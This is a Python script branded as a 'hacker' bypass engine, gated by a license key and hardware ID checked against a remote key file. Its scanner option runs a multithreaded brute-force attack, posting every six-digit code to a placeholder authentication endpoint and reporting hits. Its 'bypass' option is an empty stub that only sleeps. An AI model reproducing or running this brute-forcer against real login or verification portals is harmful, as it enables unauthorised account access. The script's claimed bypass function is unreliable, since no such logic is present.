import requests, re, urllib3, time, threading, queue, random, sys, datetime, os, uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()
PING_THREADS = 10
scan_queue = queue.Queue()
stop_event = threading.Event()
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# LOGO & BANNER
BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"

def display_hacker_flag():
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]\n"))

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4()).split('-')[0].upper()}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT"

def success_fireworks():
    for _ in range(15):
        fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🌟", "⭐"])
        console.print(Text(fire, style=random.choice(["yellow", "cyan", "green", "white"])))
        time.sleep(0.01)

# ===============================
# LICENSE SYSTEM
# ===============================
def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def check_license_hacker_style():
    my_hwid = get_hwid()
    display_hacker_flag()
    console.print(Align.center(Panel(f"[bold white]HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="bold cyan", expand=False)))
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    if not user_key: sys.exit()
    try:
        res = requests.get(URL, timeout=10)
        for entry in res.text.splitlines():
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("[red]❌ HWID MISMATCH![/red]"); sys.exit()
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "FREE")
                if not is_active:
                    console.print(f"[red]❌ KEY EXPIRED! (Expiry: {date_label})[/red]"); sys.exit()
                success_fireworks()
                return True
        console.print("[red]❌ INVALID KEY![/red]"); sys.exit()
    except: console.print("[red]📡 CONNECTION ERROR![/red]"); sys.exit()

# ===============================
# SCANNER LOGIC
# ===============================
def scanner_worker():
    while not scan_queue.empty():
        code = scan_queue.get()
        try:
            # ဒီနေရာမှာ target url ကို ပြင်သုံးပါ
            r = requests.post("http://target-portal.com/auth", data={'code': code}, timeout=3)
            if "Success" in r.text: console.print(f"[bold green][!] Found Hit: {code}[/bold green]")
        except: pass
        scan_queue.task_done()

# ===============================
# BYPASS LOGIC
# ===============================
def start_bypass_process():
    display_hacker_flag()
    console.print("[yellow][*] Starting Bypass Engine...[/yellow]")
    # (Previous Bypass Code Logic...)
    time.sleep(2)

# ===============================
# MAIN MENU
# ===============================
if __name__ == "__main__":
    if check_license_hacker_style():
        while True:
            display_hacker_flag()
            console.print(Panel("[bold white]1. Start Bypass\n2. Start Scanner\n3. Exit[/bold white]", title="[bold cyan]MENU[/bold cyan]"))
            choice = input(" [?] Choose Option: ")
            
            if choice == "1":
                start_bypass_process()
            elif choice == "2":
                console.print("[yellow][*] Initializing Scanner...[/yellow]")
                for i in range(100000, 999999): scan_queue.put(str(i))
                for i in range(20): 
                    t = threading.Thread(target=scanner_worker); t.daemon = True; t.start()
                scan_queue.join()
                input("\nScanning Finished. Press Enter to return to menu...")
            elif choice == "3":
                sys.exit()
